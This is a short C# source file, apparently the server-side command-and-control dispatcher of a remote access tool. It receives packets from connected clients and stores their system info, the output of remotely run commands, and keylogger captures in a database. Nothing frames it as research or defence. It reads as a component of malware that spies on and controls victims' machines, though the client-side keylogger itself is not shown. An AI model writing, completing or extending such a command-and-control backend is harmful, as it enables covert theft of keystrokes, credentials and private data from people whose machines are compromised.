using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Data.SqlClient;
using System.Data;
using SharedLibrary;

namespace RemoteCommand
{
    class CommandDispatcher
    {
        private DatabaseService _db;
        private Logger _logger;

        public CommandDispatcher(DatabaseService db, Logger logger)
        {
            _db = db;
            _logger = logger;
        }

        public void Dispatch(ClientHandler client, Packet packet)
        {
            switch(packet.Command)
            {
                case "INFO":
                    HandleClientInfo(client, packet);
                    break;

                case "CMD_RESULT":
                    HandleCmdResult(client, packet);
                    break;

                case "KEYLOG":
                    HandleKeylog(client, packet);
                    break;

                default:
                    _logger.Log("Unknown command: " + packet.Command);
                    break;
            }
        }


        private void HandleClientInfo(ClientHandler client, Packet packet)
        {
            _logger.Log("Client info received");
            _db.SaveLog(client.Id, "INFO", packet.Data);
        }


        private void HandleCmdResult(ClientHandler client, Packet packet)
        {
            _db.SaveLog(client.Id, "CMD", packet.Data);

        }

        private void HandleKeylog(ClientHandler client, Packet packet)
        {

            _db.SaveKeylog(client.Id, packet.Data);
            
        }
    }
}
